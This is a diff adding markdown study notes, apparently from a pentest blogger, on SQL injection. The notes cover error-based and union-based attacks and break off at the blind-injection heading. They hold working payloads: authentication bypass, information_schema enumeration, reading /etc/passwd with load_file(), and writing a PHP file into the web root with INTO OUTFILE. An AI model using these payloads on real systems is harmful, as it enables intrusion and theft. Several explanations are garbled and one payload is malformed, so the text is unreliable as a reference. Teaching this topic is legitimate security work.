@@ -1,0 +1,199 @@
+
+#  What is SQL Injection ? 
+
+     SQL Injection is web Security vulnerbility that allow an attacker to interfere with sql query that an 
+     application make its database. 
+
+
+#  Types of Most Common sql injection:
+    
+      1) In-band SQL Injection  (Classic)
+  
+      2) Inferential SQL Injection (Blind)
+   
+   
+               1)  In-Band SQL Injection (Classic): 
+                       
+                           A) Error Based- SQL Injection  
+                           
+                                 a) Retrieving hidden data👿️       
+                                     
+                                 b) Subverting Application Logic 👿️                     
+                              
+                           B) Union Based SQL Injection  
+                            
+                                  a)  Understanding Layout of output using wrong value
+                            
+                                  b)  Examining & Extracting info from Database
+                                  
+                                  c)  Leveraging sql injection for code execution
+                                        
+                                            !--)   LOAD_FILE()
+                                            
+                                            !--)   IN TO OUTFILE 
+                           
+       
+                 2)  Inferential SQL Injection (Blind):
+                   
+                            A) Boolean Based SQL Injection
+                            
+                            B)  Time Based SQL Injection
+                            
+                            
+                            
+  1)  In Band SQLI (Classic):
+  
+        A)  Error Based  SQL Injection:
+                
+                  In error based attacker tries to insert malicious quary in input feilds and get some error.
+                                                             
+                       example:  ' " \ # ; ) -- --+ -- - --+-   ';-- -
+                       
+                                      ‘-- ’--+ ‘--+- ’-- - <<< this type quary generate an error. 
+                                      
+                       Working :   SELECT name from users where categeory='pets' And Release=1
+                       
+                       
+                       Note:   To break this query let's learn Logic Gate
+                       
+                                       AND LOGIC GATE 
+                                       
+                                       
+| 1  | AND  | 1  | TRUE |
+| 1 | AND  | 0 | FALS |
+| 0 | AND  | 1 | FALS |
+| 0 | AND  | 0  | FALS |
+           
+                                       
+                                       OR LOGIC GATE 
+                                       
+                                       
+| 1  | OR  | 1  | TRUE |
+| 1  | OR  | 0  | TRUE |
+| 0 | OR  | 1 | TRUE |
+| 0  | OR  | 0  | FALS |
+
+            
+            
+                           Working2:  If we put some quote ‘ then generate an error because query usage ’ quote
+                                     
+                                            # keep in mind always test ' " -- 
+                                            
+                                            
+                             Result:     SELECT name from users where categeory='pets'--' And Released=1 
+                                   
+                                         ‘ is closed pets categeory and -- is used to comment all after ’ And Released=1
+                                         
+                                         
+                             # Notes: 
+                                           Always mysql function return 1 but if we used OR 1=1 then we can true.
+                                           
+                                           pets' OR 1=1--  # 1 OR 1 : TRUE According to Logic Gate;
+                                           
+                                           
+                   a) Retrieving hidden data👿️  :
+                   
+                           To retrieving hidden data, you can follow below quary :
+                           
+                             SELECT player from players where player='$player'  
+                             
+                                   #  player is using ‘ quato we can use ’ to break this quary. then put -- to comment
+                                       all feild after that we will put OR .
+                                       
+                                       admin' OR 1=1--  if (0 OR 1=1)  then return true because logic gate/
+                                       
+                                     #  admin' OR 1=1-- 
+                                     
+                                     #    SELECT player from players where player='$player' OR 1=1--' 
+                                     
+                                     #   Above quary return true .   
+                                     
+                                     #   we can use limit 1 # if you have lot' of use retrieve 
+                                     
+                                          admin' or 1=1 LIMIT 1--
+                                            
+                   b) Subverting application logic👿️:
+                                                
+                             #NOTE: SELECT * from users where user='$username' AND password='$password'
+                             
+                             # if we put ‘ then it will be break bec it usage ’$username' < single quote 
+                             
+                             # suppose we put wrong username and wrong password
+                             
+                             pentestblog' OR 1=1-- < this will comment ‘ AND passoword=’$password'
+                                            
+                             Above quary return true bec: 
+                             
+                               # we do not username :   
+                                 
+                                  0  OR 1 : true according to logic gate . 
+                                  
+                 
+        B) Union Based SQL Injection :
+        
+                 UNION is used to add two additional select statement
+                 
+                 # suppose if we put ; in terminal then we can add multiple command.
+                 
+                 SELECT player from players where player = 'admin' UNION SELECT * from users-- '  < after -- 
+                   
+                   single ' is comment .. and we will retrieve all users from users table. 
+                   
+                   
+                   
+                 a)  Understanding Layout of output using wrong value:
+                 
+                         # we put some bad number in id or name parameter 
+                         
+                         SELECT name from users where id = 1 # we put wrong id 
+                         
+                         http://pentestblog.in/hacking?id=10' UNION select 1,2,3 # this will show output.
+                         
+                         # To find out columns in database use order by 
+                         
+                          order by 1,2,3  
+                          
+                  b)  Examining & Extracting info from Database:
+                           
+                            user(), @@version, database(), @@hostname 
+                           
+                            group_concat() is used to concat multiple rows in one field
+                            
+                            schema_name is used to find out what is using mysql or another sql server
+                            
+                           # Database enumeration:
+                              
+                               union select 1,2,schema_name from information_schema.schemata--      
+                               
+                            # All Database List: "\n", new line one line output
+                            
+                               union select 1,2group_concat(schema_name) from information_schema.schemata--
+                           
+                            # Table Name Enumeration       
+                                
+                                union+select+group_concat("\n",table_name,"\n")
+                                +from+information_schema.tables+where+table_schema='november'--+
+                                
+                            # Columns Name Enumeration             
+                                    
+                                  union+select+group_concat("\n",column_name,"\n")
+                                   +from+information_schema.columns+where+table_schema='november'--+
+                       
+                            # Retrieve Data 
+                                             
+                                union+select+group_concat("\n",one,"\n")+from+flag--+ 
+                   
+                      
+                  
+                   c) Leveraging For Code Execution :
+                   
+                        !--) LOAD_FILE :  player=ippsecd'union+select+load_file('/etc/passwd')-- 
+                   
+                        !--) INTO OUTFILE:  player=ippsecd'union+select+'hi' into outfile ‘/var/www/p.php’-- 
+                        
+                        
+                        
+                        
+                        
+                        
+   2)  Inferential SQL Injection (Blind): 
